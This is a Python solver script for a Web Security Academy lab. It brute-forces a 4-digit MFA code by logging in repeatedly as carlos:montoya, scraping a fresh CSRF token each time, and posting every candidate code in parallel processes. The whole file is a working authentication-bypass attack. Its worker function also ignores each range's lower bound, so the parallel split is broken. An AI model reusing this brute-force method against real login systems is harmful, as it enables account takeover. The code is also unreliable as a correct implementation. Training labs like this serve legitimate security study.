import requests
import sys  # instructions say to import this lib; but it isn't being used
from bs4 import BeautifulSoup
import multiprocessing

"""
site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')
"""
# For me only
site = 'ac741fc81e815a2f8060849b00e0009a.web-security-academy.net'
s = requests.Session()
answer = multiprocessing.Value('i', -1)


# Credit to https://stackoverflow.com/questions/14822184/is-there-a-ceiling-equivalent-of-operator-in-python
# For this function idea
def ceildiv(a, b):
    return -(-a // b)


def try_code(csrf, code):
    # Second page
    login2_url = f'https://{site}/login2'
    login2data = {
        'csrf': csrf,
        'mfa-code': str(code).zfill(4)
    }
    resp = s.post(login2_url, data=login2data, allow_redirects=False)
    if resp.status_code == 302:
        with answer.get_lock():
            answer.value = int(login2data["mfa-code"])
    return resp.status_code


def get_csrf():
    login_url = f'https://{site}/login'
    resp = s.get(login_url)
    soup = BeautifulSoup(resp.text, 'html.parser')
    csrf = soup.find('input', {'name': 'csrf'}).get('value')

    logindata = {
        'csrf': csrf,
        'username': 'carlos',
        'password': 'montoya'
    }
    # print(f'Logging in as carlos:montoya')
    resp = s.post(login_url, data=logindata)
    # print(f'Login response: {resp.text}')

    soup = BeautifulSoup(resp.text, 'html.parser')
    return soup.find('input', {'name': 'csrf'}).get('value')


def dispatch_requests(range_arg):
    low = range_arg[0]
    high = range_arg[1]
    iterations = ceildiv(high - low + 1, 2)
    for x in range(iterations):
        if answer.value >= 0:
            return
        csrf = get_csrf()
        if try_code(csrf, x) == 302:
            break
        else:
            second_try = try_code(csrf, x + iterations)
            if second_try == 302:
                break
            elif second_try == 400:
                csrf = get_csrf()
                if try_code(csrf, x + iterations) == 302:
                    break


if __name__ == '__main__':
    processing = [[0, 2500], [2501, 5000], [5001, 7500], [7501, 9999]]  # This list is geared for 4 cpus
    p = multiprocessing.Pool(multiprocessing.cpu_count())
    p.map(dispatch_requests, processing)
    p.close()
    if answer.value >= 0:
        print(f"PIN: {answer.value}")
    else:
        print("PIN not found.")
